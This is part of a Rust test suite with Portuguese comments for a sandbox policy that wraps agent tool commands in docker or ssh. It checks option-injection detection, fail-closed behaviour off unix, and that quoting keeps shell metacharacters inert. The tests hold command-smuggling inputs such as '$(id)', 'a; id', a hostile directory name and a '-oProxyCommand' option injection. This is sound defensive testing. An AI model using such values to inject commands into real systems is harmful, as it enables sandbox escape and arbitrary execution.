            backend: Some(SandboxBackend::Ssh("-oProxyCommand=x".into())),
            image: "-x".into(),
            ..SandboxPolicy::default()
        };
        assert_eq!(p.wrap_command("bash", "ls", "/tmp").expect("off"), None);
    }

    #[test]
    fn parece_opcao_reconhece_hifen_apos_espaco_e_ignora_nome_normal() {
        assert!(parece_opcao("-o"));
        assert!(parece_opcao("--entrypoint=x"));
        assert!(
            parece_opcao("  -oProxyCommand=x"),
            "espaco a esquerda nao salva"
        );
        assert!(!parece_opcao("debian:bookworm-slim"));
        assert!(!parece_opcao("box.interno"));
        assert!(!parece_opcao("host-com-hifen-no-meio"));
    }

    /// #1225 F2: fora de unix o `BashTool` usa `powershell -Command` e
    /// receberia uma linha com quoting POSIX. O contrato e fail-closed, e os
    /// dois ramos sao exercitados a partir de qualquer host porque a decisao
    /// mora numa funcao parametrizada.
    #[test]
    fn plataforma_nao_unix_falha_fechado() {
        assert!(plataforma_permite_wrap(true).is_ok());
        let err = plataforma_permite_wrap(false).expect_err("nao-unix recusa");
        assert!(
            err.to_string().contains("nao suportado fora de unix"),
            "err = {err}"
        );
    }

    /// #1225 C1: o teste acima prova a FUNCAO; este prova a LIGACAO. Sem ele,
    /// apagar o `plataforma_permite_wrap(...)?` de dentro do `wrap_command_em`
    /// deixava a suite inteira verde — e fora de unix esse guard e a unica
    /// aplicacao em runtime (o `config check` e consultivo, e o
    /// `sandbox_policy_from` nao olha plataforma).
    #[test]
    fn wrap_command_nao_envolve_nada_fora_de_unix() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..SandboxPolicy::default()
        };
        let err = p
            .wrap_command_em(false, "bash", "echo nunca", "/tmp")
            .expect_err("fora de unix o wrap tem de recusar");
        assert!(
            err.to_string().contains("nao suportado fora de unix"),
            "err = {err}"
        );

        // E a recusa vem ANTES de qualquer coisa que dependa do host: sem
        // isto o teste passaria por falta de docker em vez de por plataforma.
        assert!(
            !err.to_string().contains("nao encontrado no host"),
            "o erro de backend ausente mascarou o de plataforma: {err}"
        );

        // `mode = off` continua curto-circuitando antes do guard, em
        // qualquer plataforma: sem sandbox nao ha o que recusar.
        let off = SandboxPolicy::default();
        assert_eq!(
            off.wrap_command_em(false, "bash", "ls", "/tmp")
                .expect("off nao recusa"),
            None
        );

        // E o mesmo caminho em unix segue funcionando (ou falhando por
        // ausencia de docker, que e o outro desfecho legitimo deste host).
        match p.wrap_command_em(true, "bash", "echo oi", "/tmp") {
            Ok(Some(linha)) => assert!(linha.starts_with("docker run --rm")),
            Err(e) => assert!(e.to_string().contains("fail-closed"), "e = {e}"),
            Ok(None) => panic!("mode = all deveria sandboxar `bash`"),
        }
    }

    #[test]
    fn parse_json_config() {
        let p: SandboxPolicy = serde_json::from_str(
            r#"{"mode":"allowlist","backend":"docker","sandboxed_tools":["bash"]}"#,
        )
        .expect("json deve parsear");
        assert_eq!(p.mode, SandboxMode::Allowlist);
        assert_eq!(p.backend, Some(SandboxBackend::Docker));
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("web_search"));

        // Default quando campos ausentes (config do operador mínima).
        let p: SandboxPolicy =
            serde_json::from_str(r#"{"mode":"off"}"#).expect("json deve parsear");
        assert!(!p.requires_sandbox("bash"));
    }
}

/// Regressao do escape de sandbox: metacaractere de shell precisa chegar ao
/// container como **dado**, nunca ser expandido pelo shell do host.
///
/// Os testes que ja existiam afirmavam a presenca das flags de hardening na
/// string (`--network none`, `no-new-privileges`). Nenhum afirmava inercia —
/// e era exatamente ali que o `{:?}` passava.
#[cfg(all(test, unix))]
mod shell_injection_regression {
    use super::*;

    /// Devolve as palavras que o shell REAL produz para `linha`.
    ///
    /// Se a interpolacao for insegura, `$(id)` expande aqui e o retorno traz a
    /// saida do `id` em vez do literal — que e precisamente o bug.
    fn palavras_do_shell(linha: &str) -> Vec<String> {
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("printf '%s\\n' {linha}"))
            .output()
            .expect("sh deve existir no host de teste");
        String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn sh_quote_neutraliza_metacaracteres_num_shell_real() {
        for bruto in [
            "$(id)",
            "`id`",
            "$HOME",
            "a; id",
            "a && id",
            "a | id",
            "fim\"; id; echo \"",
            "aspa'simples",
            "!bang",
            "* ? [glob]",
        ] {
            let palavras = palavras_do_shell(&sh_quote(bruto));
            assert_eq!(
                palavras,
                vec![bruto.to_string()],
                "o shell nao devolveu o literal para {bruto:?}"
            );
        }
    }

    #[test]
    fn wrap_command_entrega_o_comando_como_uma_palavra_literal() {
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..Default::default()
        };
        for comando in ["$(id)", "`id`", "ls; id", "echo 'oi'"] {
            let wrapped = p
                .wrap_command("bash", comando, "/tmp")
                .expect("wrap")
                .expect("sandbox aplicado");
            let palavras = palavras_do_shell(&wrapped);
            assert_eq!(
                palavras.last().map(String::as_str),
                Some(comando),
                "o comando deveria chegar inteiro e literal; wrapped={wrapped}"
            );
        }
    }

    #[test]
    fn cwd_hostil_nao_vira_comando_extra_nem_se_parte_em_dois() {
        let dir = std::env::temp_dir().join("garra dir; id");
        std::fs::create_dir_all(&dir).expect("mkdir");
        let cwd = dir.to_str().expect("utf8");
        let p = SandboxPolicy {
            mode: SandboxMode::All,
            backend: Some(SandboxBackend::Docker),
            ..Default::default()
        };
        let wrapped = p
            .wrap_command("bash", "ls", cwd)
            .expect("wrap")
            .expect("aplicado");
        let palavras = palavras_do_shell(&wrapped);
        // O mount chega como UMA palavra "<cwd>:<cwd>", com espaco e ';' dentro.
        assert!(
            palavras.iter().any(|w| w == &format!("{cwd}:{cwd}")),
            "mount deveria ser uma palavra so; wrapped={wrapped}"
        );
        assert!(
            !palavras.iter().any(|w| w == "id"),
            "o ';' do cwd virou comando; wrapped={wrapped}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// O ramo SSH atravessa **dois** shells: o local, e o remoto que reparseia
    /// a string que o `ssh` remonta a partir do argv. Por isso o comando leva
    /// `sh_quote` duas vezes.
    ///
    /// Este teste exercita a propriedade direto no `sh_quote`, sem passar pelo
    /// `wrap_command`, de proposito: o `wrap_command` checa
    /// `SandboxBackend::is_available()` antes de montar a string, e num host
    /// sem cliente `ssh` instalado ele devolve (corretamente) o erro
    /// fail-closed. Amarrar a regressao a presenca do binario faria o teste
    /// passar sem exercitar nada justamente onde nao ha ssh — o mesmo defeito
    /// de teste vacuo descrito na #1230.
    #[test]
    fn duas_camadas_de_quoting_sobrevivem_a_dois_shells() {
        for bruto in ["$(id)", "`id`", "a; id", "aspa'simples"] {
            let carga = sh_quote(&sh_quote(bruto));
            // Camada 1 — shell local: entrega UMA palavra, ainda citada.
            let apos_local = palavras_do_shell(&carga);
            assert_eq!(apos_local.len(), 1, "camada 1 partiu {bruto:?} em varias");
            // Camada 2 — shell remoto: reparseia e devolve o literal.
            assert_eq!(
                palavras_do_shell(&apos_local[0]),
                vec![bruto.to_string()],
                "camada 2 expandiu {bruto:?}"
            );
        }
    }

    /// Uma unica camada NAO basta no caminho do `ssh` — guarda contra alguem
    /// "simplificar" o quoting duplo achando que e redundante.
    #[test]
    fn uma_camada_so_seria_insuficiente_para_o_ssh() {
        let uma = sh_quote("$(id)");
        let apos_local = palavras_do_shell(&uma);
        assert_eq!(apos_local, vec!["$(id)".to_string()]);
        // O shell remoto receberia isto SEM aspas e expandiria.
        let apos_remoto = palavras_do_shell(&apos_local[0]);
        assert_ne!(
            apos_remoto,
            vec!["$(id)".to_string()],
            "se isto passar a ser igual, o quoting duplo virou desnecessario \
             e o comentario do ramo SSH precisa ser revisto"
        );
    }
}
